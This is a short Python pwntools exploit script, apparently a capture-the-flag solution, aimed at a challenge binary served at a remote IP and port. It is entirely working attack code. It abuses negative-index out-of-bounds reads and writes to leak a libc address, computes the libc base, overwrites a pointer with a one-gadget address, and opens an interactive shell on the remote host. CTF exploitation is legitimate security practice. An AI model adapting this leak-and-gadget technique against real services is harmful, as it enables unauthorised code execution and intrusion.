#!/usr/bin/env python3
from pwn import *

#context.log_level='debug'
e=ELF('./chal')
loc=0

if loc==1:
	p=gdb.debug('./chal', 'b main')
	libc=ELF('libc.so.6')
else:
	p=remote('134.209.237.231', 4273)
	libc=ELF('libc.so')

offset = [-144//8, -96//8]

def sendcom(t, msg):
	p.recvuntil('>')
	p.sendline(str(t))
	p.recvuntil(':')
	p.sendline(str(msg))

sendcom(2, offset[0])
p.recvuntil(': ')
leak = int(str(p.recvline()), 16) # __libc_start_main@libc
base = leak-libc.symbols['__libc_start_main']
log.info('libc base : {}'.format(hex(base)))

payload = str(base+0xe3b01)
sendcom(1, offset[1])
p.sendline(payload)
p.sendline('4')

p.interactive()
p.close()
